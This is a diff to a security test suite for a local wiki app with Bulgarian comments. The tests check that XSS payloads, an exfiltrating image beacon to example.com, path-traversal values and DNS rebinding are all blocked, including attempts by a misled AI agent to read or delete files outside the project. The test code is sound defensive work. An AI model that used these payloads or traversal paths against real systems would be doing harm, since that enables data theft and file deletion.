@@ -122,8 +122,9 @@ CLEAN-TEXT-MARKER
 <a id="jslink" href="javascript:document.title='XSS-RAN'">raw link</a>
 <a href="  java&#10;script:document.title='XSS-RAN'">hidden scheme</a>
 <a id="okay" href="https://example.com/a">good link</a>
+<img id="beacon" src="https://example.com/leak?d=secret">
 
-Markdown: [md link](javascript:document.title='XSS-RAN') and [data link](data:text/html,x).
+Markdown: [md link](javascript:document.title='XSS-RAN') and [data link](data:text/html,x) and ![pixel](https://example.com/p.png) and ![pixel2](//example.com/p.png).
 `;
 
 test(T('security', 'Content from a document cannot run code in the browser', 'Съдържание от документ не може да изпълни код в браузъра'), {
@@ -140,6 +141,9 @@ test(T('security', 'Content from a document cannot run code in the browser', 'С
     assert.doesNotMatch(html, /onerror|onload|onclick|<script|<iframe|<svg|position:\s*fixed|inset-0/i);
     const hrefs = await b.evaluate(`JSON.stringify([...document.querySelectorAll('.reading a[href]')].map((a) => a.href))`);
     for (const h of JSON.parse(hrefs)) assert.match(h, /^(https?:|mailto:)/, h);
+    // Картинка от чужд адрес се зарежда сама и може да изнесе данни (в архива няма CSP): не остава в страницата.
+    const srcs = await b.evaluate(`JSON.stringify([...document.querySelectorAll('.reading img')].map((i) => i.getAttribute('src')))`);
+    for (const s of JSON.parse(srcs)) assert.doesNotMatch(String(s), /^(https?:)?\/\//i, s);
     assert.equal(await b.evaluate(`document.querySelector('.reading a[href="https://example.com/a"]')?.textContent`), 'good link', 'safe links stay');
     // Втората защита: дори нещо да мине през пречистването, вграденият код не се изпълнява.
     await b.evaluate(`(() => { const d = document.createElement('div'); d.innerHTML = '<img src=x onerror="document.title=&quot;CSP-FAILED&quot;">'; document.body.append(d); const s = document.createElement('script'); s.textContent = 'document.title="CSP-FAILED"'; document.body.append(s); })()`);
@@ -204,6 +208,60 @@ test(T('security', 'Claude can read only inside the project folder', 'Claude м�
     ['Grep', { pattern: 'x' }], ['Grep', { pattern: 'x', path: 'wiki', glob: '**/*.md' }], ['Glob', { pattern: 'wiki/**/*.md' }],
   ]) assert.equal(guard(tool, input), 0, `${tool} ${JSON.stringify(input)}`);
   assert.notEqual(spawnSync(process.execPath, [path.join(box.root, 'scripts/guard-read.js')], { input: 'not json', encoding: 'utf8' }).status, 0, 'unreadable request is refused');
+});
+
+test(T('security', 'Claude cannot copy files from outside raw/ through text extraction', 'Claude не може да копира файлове извън raw/ чрез извличането на текст'), () => {
+  // Claude има право да пуска `npm run extract <път>`. Път извън raw/ не бива да се извлича: иначе текстът на чужд файл
+  // попада в проекта, където Claude може да го прочете.
+  const tag = `x${process.pid}${Date.now()}`;
+  const sibling = path.join(path.dirname(box.root), `${tag}-other-project`);
+  fs.mkdirSync(sibling, { recursive: true });
+  fs.writeFileSync(path.join(sibling, 'secret.txt'), 'SECRET-OUTSIDE');
+  box.write('.library-auth.json', '{"salt":"00","hash":"00"}');
+  try {
+    for (const target of [path.join(sibling, 'secret.txt'), `../${path.basename(sibling)}/secret.txt`, 'raw/../.library-auth.json', '.library-auth.json']) {
+      const r = box.script('extract.js', target);
+      assert.notEqual(r.status, 0, target);
+      assert.match(r.stderr + r.stdout, /raw\//, target);
+    }
+    // Там, където старият код би записал текста: в проекта и до него
+    assert.ok(!box.exists(`${path.basename(sibling)}/secret.txt.md`), 'copied into the project');
+    assert.ok(!box.exists('raw/.library-auth.json.md'), 'password file copied under another name');
+    // Обикновен файл в raw/ се извлича както преди
+    box.write('raw/articles/plain.txt', 'plain text');
+    assert.equal(box.script('extract.js', 'raw/articles/plain.txt').status, 0);
+    assert.ok(box.exists('raw/.extracted/articles/plain.txt.md'));
+  } finally { fs.rmSync(sibling, { recursive: true, force: true }); fs.rmSync(path.join(box.root, '.library-auth.json'), { force: true }); }
+});
+
+test(T('security', 'A forged raw_path cannot delete files outside the library', 'Подправен raw_path не може да изтрие файлове извън библиотеката'), () => {
+  const victim = path.join(path.dirname(box.root), `victim-${process.pid}-${Date.now()}.md`);
+  fs.writeFileSync(victim, 'must stay');
+  // raw/../../../<име> води до папката над проекта (както би го написал подведен Claude)
+  const rawPath = `raw/../../../${path.basename(victim, '.md')}`;
+  box.write('wiki/sources/forged-src.md', `---\ntitle: Forged\ntype: source\ntags: []\nsources: []\nrelated: []\ncreated: 2026-01-01\nupdated: 2026-01-01\nconfidence: low\nraw_path: ${rawPath}\nformat: article\n---\n\n# Forged\n`);
+  try {
+    const r = box.script('remove.js', 'forged-src', '--apply');
+    assert.equal(r.status, 0, r.stderr);
+    assert.ok(fs.existsSync(victim), 'the file outside the library was deleted');
+    assert.ok(!box.exists('wiki/sources/forged-src.md'), 'the page itself is removed as usual');
+  } finally { fs.rmSync(victim, { force: true }); fs.rmSync(path.join(box.root, 'wiki/sources/forged-src.md'), { force: true }); }
+});
+
+test(T('security', 'The guard settings are outside the folders Claude may write to', 'Настройките на пазача са извън папките, в които Claude може да пише'), async () => {
+  const { guardArgs } = await import(pathToFileURL(path.join(box.root, 'scripts', 'agent.js')).href);
+  const args = guardArgs();
+  const file = args[args.indexOf('--settings') + 1];
+  assert.ok(file && fs.existsSync(file), 'the settings file exists');
+  for (const dir of ['wiki', 'outputs']) assert.ok(path.relative(path.join(box.root, dir), file).startsWith('..'), `inside ${dir}/`);
+  assert.match(fs.readFileSync(file, 'utf8'), /guard-read\.js/);
+  if (process.platform !== 'win32') assert.equal(fs.statSync(path.dirname(file)).mode & 0o077, 0, 'the folder is private');
+});
+
+test(T('security', 'The my.wiki name is accepted only after it is set in hosts', 'Името my.wiki се приема само след запис в hosts'), async () => {
+  // .wiki е истински домейн: без запис в hosts чужд сървър би могъл да се представи като my.wiki (DNS rebinding).
+  assert.ok(!box.exists('.wiki-launch'));
+  for (const host of ['my.wiki', `my.wiki:${srv.port}`]) assert.equal((await rawRequest(srv.port, { url: '/api/pages', headers: { host } })).status, 403, host);
 });
 
 test(T('security', 'The addresses are checked at the moment of connecting (DNS rebinding)', 'Адресите се проверяват в момента на свързване (DNS rebinding)'), async () => {
